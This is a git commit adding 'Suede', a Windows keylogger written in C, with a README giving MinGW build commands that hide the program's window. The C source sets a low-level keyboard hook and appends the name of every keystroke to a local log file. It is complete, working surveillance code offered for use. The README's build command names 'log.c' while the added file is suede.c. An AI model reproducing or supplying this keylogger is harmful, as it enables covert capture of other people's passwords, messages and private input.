9f3e58a55e98ea46310d7a0a18af8ae84f24d098
Steven Penny <svnpenn@gmail.com>
2014-09-29 05:50:14 -0500

    Suede

---
+++ README.txt
@@ -0,0 +1,16 @@
+Suede
+================================================================================
+Windows API keylogger
+
+Install
+================================================================================
+x86_64-w64-mingw32-gcc -mwindows -osuede log.c
+
+Or for extra checks
+
+x86_64-w64-mingw32-gcc -Wall -Wextra -pedantic -std=c99 -mwindows -osuede log.c
+
+Thanks
+================================================================================
+Keylogger in C
+http://hackerthedude.blogspot.com/2009/10/keylogger-in-c.html
---
+++ suede.c
@@ -0,0 +1,43 @@
+#include <stdio.h>
+#include <windows.h>
+HHOOK hKeyHook;
+
+__declspec(dllexport) LRESULT CALLBACK
+KeyEvent (int nCode, WPARAM wParam, LPARAM lParam) {
+  if (
+    (nCode == HC_ACTION) &&
+    ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))
+  ) {
+    KBDLLHOOKSTRUCT * hooked = (KBDLLHOOKSTRUCT *) lParam;
+    DWORD dwMsg = 1;
+    dwMsg += hooked->scanCode << 16;
+    dwMsg += hooked->flags << 24;
+    char kn[] = "Windows Right";
+    GetKeyNameText(dwMsg, kn, sizeof kn);
+    FILE * fpt = fopen("suede.log", "a");
+    fprintf(fpt, "_%s", kn);
+    fflush(fpt);
+  }
+  return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
+}
+
+void MsgLoop() {
+  MSG message;
+  while (GetMessage(&message, 0, 0, 0)) {
+    TranslateMessage(&message);
+    DispatchMessage(&message);
+  }
+}
+
+DWORD WINAPI KeyLogger() {
+  HINSTANCE hExe = GetModuleHandle(0);
+  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, hExe, 0);
+  MsgLoop();
+  UnhookWindowsHookEx(hKeyHook);
+  return 0;
+}
+
+int main() {
+  HANDLE thd = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) KeyLogger, 0, 0, 0);
+  return WaitForSingleObject(thd, INFINITE);
+}
